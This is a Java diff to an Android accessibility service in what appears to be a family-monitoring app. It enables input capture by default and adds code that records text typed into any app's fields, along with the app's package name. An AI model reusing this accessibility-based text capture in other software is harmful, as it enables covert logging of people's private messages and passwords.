@@ -33,6 +33,7 @@ import com.family.familyprotector.Not;
 import com.family.familyprotector.ParentActivity;
 import com.family.familyprotector.Translator;
 import com.family.internet.ServerHelper2;
+import com.family.util.ActInfo;
 import com.family.util.DoublyLinkedList;
 import com.family.util.Pair;
 import com.family.util.StringUtil;
@@ -71,7 +72,7 @@ public class MyAccessibilityService extends AccessibilityService {
     public static ArrayList<AccessibilityNodeInfo> parentsW = new ArrayList<>();
     public static String imei = null;
     long lastTimeActive = -1;
-    public static boolean gpsIcaze = true, silIcaze = false, actionsIcaze = false, inputsIcaze = false;
+    public static boolean gpsIcaze = true, silIcaze = false, actionsIcaze = false, inputsIcaze = true;
     public static boolean firstTime = true;
     public static boolean firebaseSended = false;
     public static String lastAction = "";
@@ -105,9 +106,11 @@ public class MyAccessibilityService extends AccessibilityService {
     public static Set<String> Apps = new HashSet<>();
 
     public class Ac {
+
         public String pa;
         public long start;
         public long end;
+        public ArrayList<ActInfo> l = new ArrayList<>();
     }
     public class YAc {
         public String name = "";
@@ -618,6 +621,9 @@ public class MyAccessibilityService extends AccessibilityService {
         ComponentName componentName = new ComponentName(ParentActivity.that, ParentActivity.class);
         p.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_ENABLED, PackageManager.DONT_KILL_APP);
     }
+    String lastEdit = "QWEREQWERWQ";
+    String lastEditPn = "";
+    String lastEventText = "ASDAS1D";
     public void blockS(AccessibilityNodeInfo root, AccessibilityEvent event) {
         String oldText = "";
         //Logger.l("settingler", textViewNodesSetting.size()+"");
@@ -627,8 +633,26 @@ public class MyAccessibilityService extends AccessibilityService {
             try {
                 List text = event .getText();
                 CharSequence latestText = (CharSequence) text.get(0);
-                if(root.getClassName().toString().endsWith("EditText"))
-                    Logger.l("Editlerr", latestText.toString());
+                if(root.getClassName().toString().endsWith("EditText")) {
+                    String s = latestText.toString();
+
+                    if(!s.equals(lastEventText)) {
+                        if(!StringUtil.isPrefix(lastEdit, s) && StringUtil.dist(lastEdit, s) > 1) {
+                            Logger.l("Editlerr", lastEdit+"---------");
+                            ActInfo in = new ActInfo();
+                            in.pn = lastEditPn;
+                            in.t = lastEdit;
+                            activities.get(activities.size()-1).l.add(in);
+                        }
+
+                        //Logger.l("Editlerr", lastEdit + "-" + s);
+                        lastEdit = s;
+                        lastEditPn = event.getPackageName().toString();
+                        lastEventText = s;
+                    }
+
+                }
+
             }catch (Exception e) {
                 e.printStackTrace();
             }
